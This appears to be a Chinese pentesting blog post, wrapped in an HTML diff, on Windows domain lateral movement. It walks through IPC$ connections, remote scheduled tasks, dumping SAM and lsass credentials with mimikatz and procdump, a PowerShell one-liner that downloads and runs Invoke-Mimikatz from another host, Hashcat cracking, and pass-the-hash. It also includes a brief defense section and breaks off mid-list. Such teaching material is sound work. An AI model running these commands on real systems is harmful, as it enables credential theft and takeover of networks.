@@ -1,0 +1,343 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>域内横向移动一 - Guko's Blog</title><meta name="description" content="利用域内横向移动技术，以被攻陷的系统为跳板，访问其他域内主机，扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产）通过此类攻击手法，最终可能获取域控制器的访问权限，甚至完全控制基于Windows操作系统的基础设置和与业务相关的关键账户0x01 常用的"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">域内横向移动一</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">域内横向移动一</h1><div class="post-meta">2020-06-27<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>利用域内横向移动技术，以被攻陷的系统为跳板，访问其他域内主机，扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产）</p>
+<a id="more"></a>
+
+<p><img src="/2020/06/27/域内横向移动一/1.png" alt></p>
+<p>通过此类攻击手法，最终可能获取域控制器的访问权限，甚至完全控制基于Windows操作系统的基础设置和与业务相关的关键账户</p>
+<h4 id="0x01-常用的windows远程连接和相关命令"><a href="#0x01-常用的windows远程连接和相关命令" class="headerlink" title="0x01 常用的windows远程连接和相关命令"></a>0x01 常用的windows远程连接和相关命令</h4><p>在拿到目标计算机的用户明文密码或者NTLM Hash后，可通过PTH(Pass the Hash，凭据传递)的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程windows操作系统中执行命令。像在多层代理环境中进行渗透，由于网络条件差，无法使用图形化界面连接远程主机。这个时候就可以用命令行的方式连接远程主机，最好是windows自带的方法对远程目标系统进行命令行下的连接操作，并执行相关命令</p>
+<h5 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h5><p>IPC(Inter Process Connection)共享<code>命名管道</code>的资源，是为了实现进程间通信而开放的命名管道。<code>IPC</code>可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p>
+<p>通过<code>ipc$</code>可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p>
+<p>建立一个<code>ipc$</code>并查看当前连接输入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ &quot;Admin!@#$4321&quot; /user:administrator</span><br><span class="line">net use</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/2.png" alt></p>
+<p><strong>1、ipc$的利用条件</strong></p>
+<ul>
+<li>开启了139、445端口</li>
+</ul>
+<p><code>ipc$</code>可以实现远程登录及对默认共享资源的访问，而139端口的开启表示NetBIOS协议的应用。通过139、445端口，可以实现对共享文件/打印机的访问。因此，一般来讲，<code>ipc$</code>需要<code>139、445端口</code>的支持</p>
+<ul>
+<li>管理员开启了默认共享</li>
+<li>默认共享是为了方便管理员进行远程管理而默认开启，包括所有的逻辑盘（<code>c$</code>、<code>d$</code>、<code>e$</code>等）和系统目录<code>wint或Windows（admin$）</code>。通过ipc,可以实现对这些默认贡献目录的访问</li>
+</ul>
+<p><strong>2、ipc$连接失败的原因</strong></p>
+<ul>
+<li>用户名或密码错误</li>
+<li>目标没有打开ipc$共享目录</li>
+<li>不能成功连接目标的139、445端口</li>
+<li>命令输入错误</li>
+</ul>
+<p><strong>3、常见错误</strong></p>
+<ul>
+<li>错误号5:拒绝访问</li>
+<li>错误号51:windows无法找到网络路径，即网络中存在问题</li>
+<li>错误号53:找不到网络路径，包括IP地址错误、目标未开机、目标lanmanserver服务未启动、目标有防火墙（端口过滤）</li>
+<li>错误号67:找不到网络名，包括lanmanworkstation服务未启动、ipc$已被删除</li>
+<li>错误号1219:提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了ipc$,需要在删除原连接后重新进行连接</li>
+<li>错误号1326:未知的用户名或密码错误</li>
+<li>错误号1792:试图登录，但是网络登录服务没有启动，包括目标NetLogin服务未启动（连接域控制器时会出现此情况）</li>
+<li>错误号2242:此用户的密码已经过期。例如，目标机器设置了账号管理策略，强制用户定期修改密码</li>
+</ul>
+<h5 id="使用Windows自带的工具获取远程主机信息"><a href="#使用Windows自带的工具获取远程主机信息" class="headerlink" title="使用Windows自带的工具获取远程主机信息"></a>使用Windows自带的工具获取远程主机信息</h5><p><strong>1、dir命令</strong></p>
+<p>建立连接后，使用dir命令列出远程主机中的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.1\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/3.png" alt></p>
+<p><strong>2、tasklist命令</strong></p>
+<p>在使用<code>net use</code>命令与目标主机建立<code>ipc$</code>后，使用<code>tasklist</code>命令的<code>/S 、/U、/P</code>参数列出远程主机上运行的进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.1 /U administrator /P Admin!@#$4321</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/4.png" alt></p>
+<h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><p><strong>1、at命令</strong></p>
+<p><code>at</code>是Windows自带的用于创建计划任务的命令，它主要工作在Windows Server2008之前版本的操作系统中。使用<code>at</code>命令在远程目标机器上创建计划任务的流程大致如下：</p>
+<ul>
+<li>使用<code>net time</code>命令确定远程机器当前的系统时间</li>
+<li>使用copy命令将payload文件复制到远程目标机器中</li>
+<li>使用at命令定时启动创建计划任务的记录</li>
+</ul>
+<p>在使用<code>at</code>命令在远程机器上创建计划任务之前，需要使用<code>net use</code>命令建立<code>ipc$</code></p>
+<p>（1）查看目标系统时间</p>
+<p><code>net time</code>命令可查看远程主机的系统时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/5.png" alt></p>
+<p>（2）将文件复制到目标系统中</p>
+<p>先在本地创建一个<code>calc.bat</code>文件，其内容为<code>calc</code>然后，让windows远程一个<code>计算器</code>策划那个废墟，用Windows自带的copy命令将一个文件复制到远程主机的C盘中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy calc.bat \\192.168.1.1\C$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/6.png" alt></p>
+<p>（3）使用at创建计划任务</p>
+<p>使用<code>at</code>命令让目标系统在指定时间运行一个程序,192.168.1.3是一台Windows7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.3 15:22:40 C:\calc.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/7.png" alt></p>
+<p>（4）清除at记录</p>
+<p>计划任务不会随着它本身的执行而被删除，因此在执行后记得清楚自己创建的计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.3 /delete</span><br></pre></td></tr></table></figure>
+
+<p>使用at远程执行命令后，先将执行结果写入本地文本文件，再使用<code>type</code>命令远程读取该文本文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.3 15:33:37 cmd.exe /C &quot;ipconfig&quot; &gt;C:/&quot;1.txt&quot;</span><br><span class="line">type \\192.168.1.3\C$\1.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、schtasks命令</strong></p>
+<p>Windows Vista、windows server2008及之后版本的操作系统已将at命令废弃了，可以使用schtasks命令代替at命令.schtask命令比at命令更为灵活、自由</p>
+<p>在远程主机创建一个<code>test</code>的计划任务。该计划任务在开机时启动，启动程序为C盘下的<code>calc.bat</code>启动权限是system。随后运行该计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.3 /tn test /sc onstart /tr c:\cala.bat /ru system /f</span><br><span class="line">schtasks /run /s 192.168.1.3 /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/8.png" alt></p>
+<p>这里使用<code>schtasks</code>命令不需要密码是因为之前已经建立了<code>ipc$</code>在没有建立<code>ipc$</code>的情况下，需要添加<code>/u和/p</code>的参数。<code>schtasks</code>命令参数如下</p>
+<ul>
+<li>/u : administrator</li>
+<li>/p: “Admin!@#$4321”</li>
+<li>/f: 强制删除</li>
+</ul>
+<p>计划任务运行后，删除该计划任务，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.3 /tn &quot;test&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/9.png" alt></p>
+<p>最后，删除<code>ipc$</code>需要确认删除的是自己创建的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use 名称 /del /y</span><br><span class="line">net use \\192.168.1.1 /del /y</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/10.png" alt></p>
+<p>在使用<code>schtasks</code>命令时，会在系统中留下日志文件<code>C:\Windows\Tasks\SCHEDLGU.txt</code>如果执行<code>schtasks</code>命令后没有回显，可配合<code>ipc$</code>执行文件，使用<code>type</code>命令远程查看执行结果</p>
+<h4 id="0x02-Windoors系统散列值获取"><a href="#0x02-Windoors系统散列值获取" class="headerlink" title="0x02 Windoors系统散列值获取"></a>0x02 Windoors系统散列值获取</h4><h5 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h5><p>windows操作系统通常使用两种方法对用户的明文密码进行加密处理。域环境中，用户信息存储在<code>ntds.dit</code>,加密后为散列值</p>
+<p>windows操作系统密码一般由两部分组成，一部分为<code>LM Hash</code>另一部分为<code>NTLM Hash</code>在Windows中，Hash的结构通常如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>
+
+<p>LM Hash全名为<code>LAN Manager Hash</code>是微软为了提高windows操作系统的安全性能而采用的散列加密算法，其本质是DES加密，密码不足14字节将用0补全。LM Hash较容易破解，但微软仅仅是将LM Hash禁用了<code>从windows Vista和windows server 2008版本开始，Windows操作系统默认禁用LM Hash</code>。LM Hash明文密码限定在14位以内，也就是说，如果要停止使用LM Hash 将用户密码设置为14位以上即可。如果LM Hash被禁用，通过工具抓取的LM Hash通常为”add3b435b51404eeaad3b435b51404ee”表示LM Hash为空值或被禁用</p>
+<p>NTLM Hash是微软为了提高安全性的同时兼容而设计的散列加密算法。NTLM Hash 是基于MD4加密算法进行加密的。个人版从Windows vista 服务器版从windows server2003以后，windows操作系统的认证方式均为NTLM Hash</p>
+<h5 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h5><p>要想在windows操作系统中抓取散列值或明文密码，必须将权限提升至<code>system</code>。本地用户名、散列值感和其他安全验证信息都存在<code>SAM</code>文件中。<code>lsass.exe</code>进程用于实现windows的安全策略（本地安全策略和登录策略）。可以使用工具将散列值和明文密码从内存中的<code>lsass.exe</code>进程或<code>SAM文件</code>中导出</p>
+<p>在windows操作系统中，<code>SAM</code>文件保存的位置是<code>C:\windows\systen\config</code> 该文件是被锁定的，不允许复制。在渗透中，可在关闭操作系统后，使用PE盘进入文件管理环境，直接复制SAM文件，也可使用VSS等方法进行复制</p>
+<p><strong>1、GetPass</strong></p>
+<p>打开GetPass工具，根本当前系统的版本运行对应的程序，即可获得</p>
+<p><img src="/2020/06/27/域内横向移动一/35.png" alt></p>
+<p><strong>2、PwDump7</strong></p>
+<p>在命令行中运行<code>PwDump7</code>程序，可得到所有账户的<code>NTLM Hash</code>可用彩虹表或在线破解，破解不出的时候可使用哈希传递的方法进行横向渗透</p>
+<p><img src="/2020/06/27/域内横向移动一/15.png" alt></p>
+<p><strong>3、QuarkPwDump</strong></p>
+<p>管理员权限下运行,导出用户的<code>NTLM Hash</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe --dump-hash-local</span><br><span class="line">QuarksPwDump.exe -dhl -o 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/11.png" alt=" "></p>
+<p><strong>4、通过SAM和SYSTEM文件抓取密码</strong></p>
+<p>（1）导出<code>SAM和SYSTEM文件</code>到本地磁盘，无工具导出如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hive</span><br><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save hklm\security security.hive</span><br></pre></td></tr></table></figure>
+
+<p>（2）通过读取<code>SAM</code>文件和<code>System</code>文件获得<code>NTLM Hash</code></p>
+<p>mimikatz可执行哈希传递、票据传递或构建黄金票据（Golden Ticket）</p>
+<p>将把导出的<code>sam.hive</code>跟<code>system.hive</code>文件放到<code>mimikatz</code>通目录下，运行mimikatz，输入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/12.png" alt></p>
+<p>(3) 使用mimikatz直接读取本地的<code>SAM文件</code>，导出<code>hash</code>值</p>
+<p>这里需要在目标机器上运行，打开后，输入如下命令，将权限提升到<code>system</code>最后读取本地的SAM文件，获得<code>NTLM Hash</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/13.png" alt></p>
+<p><strong>5、使用mimikatz在线读取SAM文件</strong></p>
+<p>在线读取散列值及明文密码，如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/14.png" alt></p>
+<p><strong>6、使用mimikatz离线读取lsass.dmp文件</strong></p>
+<p>（1）导出lasses.dmp文件</p>
+<p>在Windows NT6中找到<code>lsass.exe</code>进程，单击右键，在弹出的快捷菜单中选择<code>Create Dump File</code>选项</p>
+<p>此时会在本地生成lsass(2).exe.DMP文件</p>
+<p>（2）使用<code>Procdump</code>导出<code>lasses.dmp</code></p>
+<p>procdump是微软官方发布工具，可在命令行下将目标lsass文件导出，且杀毒软件不会拦截这些操作，下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/33.png" alt></p>
+<p>（3）使用<code>mimikatz</code>导出<code>lasses.dmp</code>文件中的密码散列值</p>
+<p>命令行中启动mimikatz，将<code>lass.dmp加载在mimikatz中</code>。先运行第一条命令，如果看到<code>Switch to MINIDUMP</code>字样，表示加载成功，再运行第二条命令，导出密码散列值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/34.png" alt></p>
+<p><strong>7、使用powershell对散列值进行Dump操作</strong></p>
+<p>Nishang的<code>Get-PassHashes.ps1</code>脚本可用来导出散列值</p>
+<p>管理员的权限打开powershelgl,进入Nishang目录，将Get-PassHashes.ps1脚本导入,之后执行<code>Get-PassHashes</code>命令，导出散列值，测试的时候在域环境中的2008R2跟单环境的win10都不成功，暂时不知道原因</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-PassHashes.ps1</span><br><span class="line">Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<p><strong>8、使用powershell远程加载mimikatz抓取散列值和明文密码</strong></p>
+<p>在命令行中远程获取密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.3:8000/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/20.png" alt></p>
+<h5 id="使用Hashcat获取密码"><a href="#使用Hashcat获取密码" class="headerlink" title="使用Hashcat获取密码"></a>使用Hashcat获取密码</h5><p><strong>1、安装Hashcat</strong></p>
+<p>下载地址：<a href="https://github.com/hashcat/hashcat/archive/v5.1.0.zip" target="_blank" rel="noopener">https://github.com/hashcat/hashcat/archive/v5.1.0.zip</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/hashcat/hashcat.git</span><br><span class="line">make //编译</span><br><span class="line">make install //安装</span><br><span class="line">./hashcat -h //查看帮助信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/16.png" alt></p>
+<p>还有一种方法是直接下载Hashcat的源码，在相应的linux操作系统中直接运行hashcat32.bin或hashcat64.bin。同时Hashcat还有可执行程序的版本，可在window中直接运行32位或64位的Hashcat，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -h</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、Hashcat的使用方法</strong></p>
+<p>使用-b参数，测试使用当前机器进行破解的基准速度，这里由于是在虚拟机中，因此使用–force参数强制执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -b --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/17.png" alt></p>
+<p>(1) 指定散列值类型</p>
+<p>使用-m参数指定散列值类型，常见散列值类型可参考Hashcat帮助或其官网：<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+<p><img src="/2020/06/27/域内横向移动一/18.png" alt></p>
+<p>(2) 指定破解模式</p>
+<p>可用 -a number来指定Hashcat的破解模式，模式乳腺癌</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 = Straight //字典破解</span><br><span class="line">1 = Combination //组合破解</span><br><span class="line">2 = Toggle-Case </span><br><span class="line">3 = Brute-force //掩码暴力破解</span><br><span class="line">4 = Permutation //组合破解</span><br><span class="line">5 = Table-Lookup</span><br></pre></td></tr></table></figure>
+
+<p>(3) 常用命令</p>
+<p>通常使用字典模式进行破解，输入如下命令，Hashcat将开始破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m xx&lt;hashfile&gt; &lt;zidianl&gt; &lt;zidian2&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-a 0:以字典模式破解</li>
+<li>-m xx:指定<hashfile>内的散列值类型</hashfile></li>
+<li><hashfile>:将多个散列值存入文本，等待破解</hashfile></li>
+<li><zidian1><zidian2>：指定字典文件</zidian2></zidian1></li>
+</ul>
+<p>将1到8指定为数字进行破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 --increment --increment-min 1--increment-max 8 ?d?d?d?d?d?d?d?d -O</span><br></pre></td></tr></table></figure>
+
+<p>破解windows散列值,命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat-m 1000 -a 0 -o winpassok.txt win.hash password.lst --username</span><br></pre></td></tr></table></figure>
+
+<p>破解WIFI握手包，命令如下，这里需要使用aircrack-ng把cap格式转换成bccap格式，才可使用hashcat破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng&lt;out.cap&gt; -J &lt;out.hccap&gt;</span><br><span class="line">hashcat -m 2500 out.hccap dics.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-m 2500:指定散列值的类型为APA/PSK</li>
+</ul>
+<p>（4）常用选项</p>
+<p>命令<code>hashcat -h</code>可查看所有选项，常用的如下</p>
+<ul>
+<li>-show: 仅显示已经破解的密码</li>
+<li>-o,outfile=File:定义散列值文件，恢复文件名和保存位置</li>
+<li>-n,-threads=NUM:线程数</li>
+<li>–remove:把破解出来的密码从散列表中移除</li>
+<li>–segment-size 512:设置内存缓存的大小，可提高破解速度，单位为MB</li>
+</ul>
+<p>处于更加方便快捷，可直接使用在线的破解网站，如下</p>
+<p><a href="http://www.xmd5.com/" target="_blank" rel="noopener">http://www.xmd5.com/</a></p>
+<p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p>
+<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p>
+<h5 id="防范抓取明文密码和散列值"><a href="#防范抓取明文密码和散列值" class="headerlink" title="防范抓取明文密码和散列值"></a>防范抓取明文密码和散列值</h5><p><strong>1、设置Active Directory2012 R2功能级别</strong></p>
+<p>windows server 2012 R2新增了一个名为<code>受保护的用户</code>的用户组。将需要保护的用户放入该组，则无法使用mimikatz等工具抓取明文密码和散列值了</p>
+<p><strong>2、安装KB2871997</strong></p>
+<p>KB2871997是解决PsExec或IPC远程查看（c$）问题的补丁，被使本地账号不再被允许远程接入计算机系统，但系统默认的本地管理员账号Administrator这个SID为500的用户例外，改名也没法，因为SID是不变的，依旧可以横向获取内网其他计算机的权限，需要禁用默认的Administrator账号，则可防御哈希传递</p>
+<p><strong>3、通过修改注册表禁止在内存中存储明文密码</strong></p>
+<p>WDigest协议，该协议能够使Windows将明文密码存储在内存中，以方便用户登录本地计算机，可通过修改注册表的方式，解决内存中以明文存储密码的问题</p>
+<p><strong>4、防御mimikatz</strong></p>
+<p>mimikatz在抓取散列值或明文密码时需要使用Debug权限（因为mimikatz需呀和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程）。将拥有Debug权限的本地管理员从Administrator组中删除,重启。</p>
+<h4 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h4><h5 id="哈希传递攻击概念"><a href="#哈希传递攻击概念" class="headerlink" title="哈希传递攻击概念"></a>哈希传递攻击概念</h5><p><code>哈希传递（Pass The Hash）攻击</code>，该方法通过找到与账户相关的密码散列值，通常是<code>NTLM Hash</code>来进行攻击。域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。若计算机的本地管理员账号和密码是相同的，就可以使用哈希传递的方法登录内网中的其他计算机，这种哈希传递，可以省去破解密码散列值，即获得密码明文的步骤</p>
+<p>Windows中，散列值是用来证明身份的（有正确的用户名和密码散列值，就能通过验证）。在windows server 2012 R2 及之后的操作系统中，默认在内存不会记录明文密码。因此可使用工具将散列值传递到其他计算机，进行权限验证，进而对其他计算机获取控制权限</p>
+<h5 id="哈希传递攻击-1"><a href="#哈希传递攻击-1" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h5><p>散列值的概念：当用户设置密码的时候，网站服务器会对用户输入的密码进行散列加密处理（通常使用MD5算法）。散列加密算法一般为单向不可逆算法。当用户登陆网站的时候，会先对用户输入的密码进行散列加密处理，再与数据库中存储的散列值进行对比，如果相同则验证成功。</p>
+<p>Windows操作系统，通常会使用NTLM Hash对访问资源的用户进行身份验证，早起的Windows操作系统，则使用LM Hash对用户密码进行验证。但是呢，当密码大于等于15位的时候，就无法使用LM Hash了。从Windows Vista和Windows Server 2008版本开始，Windows操作系统默认禁用LM Hash,因为使用NTLM Hash进行身份认证时，不会使用明文口令，而是将明文口令通过系统API（例子LsaLogonUser）转换成散列值。攻击者在获得密码散列值之后，依旧可以使用哈希传递攻击来模拟用户进行认证。</p>
+<p><strong>1、使用NTLM Hash进行哈希传递</strong></p>
+<p>实验环境：</p>
+<ul>
+<li><p>域名:hack.testlab</p>
+</li>
+<li><p>用户名:administrator</p>
+</li>
+<li><p>NTLM Hash:09bc0266e773764dc3606744ddbe133d</p>
+</li>
+</ul>
+<p>在目标机器上，以管理员的权限运行<code>mimikatz</code>输入如下命令,之后会弹出<code>cmd.exe</code>在命令行环境尝试列出域控制器或其他机器的C盘内容，dir后面跟主机名，只有是哈希相同的那么就可以列出其C盘的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;</span><br><span class="line">sekurlsa::pth /user:administrator /domain:hacke.testlab /ntlm:09bc0266e773764dc3606744ddbe133d  //可以连在一起执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/21.png" alt></p>
+<p><strong>2、使用AES-256秘钥进行哈希传递</strong></p>
+<p>实验环境：远程系统（必须安装KB2871997）</p>
+<ul>
+<li>域名：hacke.testlab</li>
+<li>用户名：administrator</li>
+<li>AES-256密钥：1670230ac09d8fdff51c080b2c98f44f5c56270f5692ab8f60df6daeaee20903</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/22.png" alt></p>
+<p>在目标机器中，以管理员权限运行<code>mimikatz</code>输入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; </span><br><span class="line">sekurlsa::pth /user:administrator /domain:hacke.testlab /aes256:1670230ac09d8fdff51c080b2c98f44f5c56270f5692ab8f60df6daeaee20903</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器再次运行，即可列出远程主机的C盘内容，测试的过程中在windows7根2008r2没装上补丁</p>
+<p>需要注意的是:</p>
+<ul>
+<li><code>dir</code>后跟要使用的主机名，而不是IP地址，否则会提示用户名或密码错误</li>
+<li>除了AES-256密钥，AES-128密钥也可以用来进行哈希传递</li>
+<li>使用AES密钥对远程主机进行哈希传递的前提是在本地安装KB2871997</li>
